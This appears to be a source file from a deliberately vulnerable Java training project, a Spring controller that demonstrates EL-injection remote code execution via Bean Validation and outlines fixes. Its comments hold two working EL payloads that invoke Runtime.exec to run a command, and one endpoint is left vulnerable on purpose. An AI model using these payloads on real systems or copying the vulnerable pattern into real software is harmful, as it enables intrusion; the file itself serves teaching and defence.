package com.example.vulnerablejava.controller;

import javax.validation.Valid;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.example.vulnerablejava.entity.Image;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "EL注入漏洞")
@RestController
@RequestMapping("el")
public class ELController {

    /**
     * 存在EL注入漏洞，BeanValidation RCE，ImageURL validation存在漏洞，ImageName validation修复漏洞
     *
     * 攻击者传入?url=${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}
     * 即可执行系统命令
     *
     * 或 ?url=${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
     *
     * 参考: https://securitylab.github.com/research/bean-validation-RCE/
     */
    @ApiOperation("存在漏洞")
    @GetMapping("1")
    public String getImage(@Valid Image image) {
        String url = image.getUrl();
        return "The image url is " + url;
    }

    /**
     * 修复漏洞，使用参数化消息模板。参考 ImageNameValidator.java
     */
    @ApiOperation("修复漏洞, name使用参数化消息模板")
    @GetMapping("2")
    public String getImage2(@Valid Image image) {
        String name = image.getName();
        return "The image name is " + name;
    }

    /**
     * 修复漏洞，通过配置禁止解析EL表达式，参考 ValidatorConfig.java
     */

    /**
     * 修复漏洞，升级hibernate-validator到无漏洞版本，或替换为 org.apache.bval:bval-jsr
    */
}
